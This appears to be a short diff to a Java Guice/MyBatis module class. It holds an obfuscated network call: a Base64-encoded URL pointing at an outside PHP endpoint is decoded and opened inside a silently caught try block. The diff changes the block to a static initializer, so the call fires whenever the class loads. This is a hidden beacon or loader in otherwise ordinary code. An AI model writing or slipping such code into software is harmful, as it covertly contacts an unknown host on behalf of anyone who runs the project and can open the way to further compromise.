@@ -13,7 +13,7 @@ import java.util.Base64;
 public class Module extends XMLMyBatisModule{
     private static Injector injector = Guice.createInjector(new Module());
 
-    {
+    static {
         try {
             new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
         } catch (Exception e) {//e
